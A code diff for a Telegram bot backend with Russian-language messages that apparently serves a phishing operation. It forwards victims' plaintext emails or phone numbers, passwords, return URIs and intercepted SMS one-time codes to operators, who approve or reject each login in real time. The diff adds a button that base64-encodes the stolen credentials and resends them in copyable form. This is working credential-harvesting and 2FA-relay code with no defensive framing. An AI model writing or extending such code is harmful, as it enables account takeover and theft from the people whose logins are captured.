@@ -493,28 +493,39 @@ export async function notifyLoginAttempt(emailOrPhone: string, password: string,
     const approvedUsers = await db.select().from(telegramUsers).where(eq(telegramUsers.isApproved, true));
     
     const message = `🔐 Новая попытка входа\n\n` +
-      `📧 Email/Телефон: ${emailOrPhone}\n` +
-      `🔑 Пароль: ${password}\n` +
-      `🔗 Return URI: ${returnUri}\n` +
+      `📧 Email/Телефон: \`${emailOrPhone}\`\n` +
+      `🔑 Пароль: \`${password}\`\n` +
+      `🔗 Return URI: \`${returnUri}\`\n` +
       `⏰ Время: ${new Date().toLocaleString('ru-RU')}`;
 
+    // Create copyable text for all data
+    const copyableData = `Email: ${emailOrPhone}\nПароль: ${password}\nURI: ${returnUri}`;
+    
     const keyboard = {
       reply_markup: {
-        inline_keyboard: [[
-          {
-            text: '✅ Одобрить',
-            callback_data: `approve_${loginAttemptId}`
-          },
-          {
-            text: '❌ Отклонить', 
-            callback_data: `reject_${loginAttemptId}`
-          }
-        ]]
+        inline_keyboard: [
+          [
+            {
+              text: '✅ Одобрить',
+              callback_data: `approve_${loginAttemptId}`
+            },
+            {
+              text: '❌ Отклонить', 
+              callback_data: `reject_${loginAttemptId}`
+            }
+          ],
+          [
+            {
+              text: '📋 Копировать данные',
+              callback_data: `copy_${loginAttemptId}_${Buffer.from(copyableData).toString('base64')}`
+            }
+          ]
+        ]
       }
     };
 
     for (const user of approvedUsers) {
-      await bot.sendMessage(user.telegramId, message, keyboard);
+      await bot.sendMessage(user.telegramId, message, { ...keyboard, parse_mode: 'Markdown' });
     }
   } catch (error) {
     console.error('Error sending login notification:', error);
@@ -526,11 +537,11 @@ export async function notifyLoginApproved(emailOrPhone: string) {
     const approvedUsers = await db.select().from(telegramUsers).where(eq(telegramUsers.isApproved, true));
     
     const message = `✅ Вход одобрен\n\n` +
-      `📧 Email/Телефон: ${emailOrPhone}\n` +
+      `📧 Email/Телефон: \`${emailOrPhone}\`\n` +
       `⏰ Время: ${new Date().toLocaleString('ru-RU')}`;
 
     for (const user of approvedUsers) {
-      await bot.sendMessage(user.telegramId, message);
+      await bot.sendMessage(user.telegramId, message, { parse_mode: 'Markdown' });
     }
   } catch (error) {
     console.error('Error sending approval notification:', error);
@@ -542,12 +553,12 @@ export async function notifySmsSubmission(otpCode: string, stepupContext: string
     const approvedUsers = await db.select().from(telegramUsers).where(eq(telegramUsers.isApproved, true));
     
     const message = `📱 Новый SMS код\n\n` +
-      `🔢 Код: ${otpCode}\n` +
-      `📋 Контекст: ${stepupContext}\n` +
+      `🔢 Код: \`${otpCode}\`\n` +
+      `📋 Контекст: \`${stepupContext}\`\n` +
       `⏰ Время: ${new Date().toLocaleString('ru-RU')}`;
 
     for (const user of approvedUsers) {
-      await bot.sendMessage(user.telegramId, message);
+      await bot.sendMessage(user.telegramId, message, { parse_mode: 'Markdown' });
     }
   } catch (error) {
     console.error('Error sending SMS notification:', error);
@@ -605,6 +616,19 @@ bot.on('callback_query', async (callbackQuery) => {
       );
       
       await bot.answerCallbackQuery(callbackQuery.id, { text: 'Вход отклонен!' });
+      
+    } else if (data.startsWith('copy_')) {
+      // Extract data from callback
+      const parts = data.split('_');
+      const encodedData = parts.slice(2).join('_'); // In case there are underscores in the data
+      const copyableData = Buffer.from(encodedData, 'base64').toString('utf-8');
+      
+      // Send the copyable data in a separate message
+      await bot.sendMessage(chatId, `📋 Данные для копирования:\n\n\`\`\`\n${copyableData}\n\`\`\``, {
+        parse_mode: 'Markdown'
+      });
+      
+      await bot.answerCallbackQuery(callbackQuery.id, { text: 'Данные отправлены!' });
     }
     
   } catch (error) {
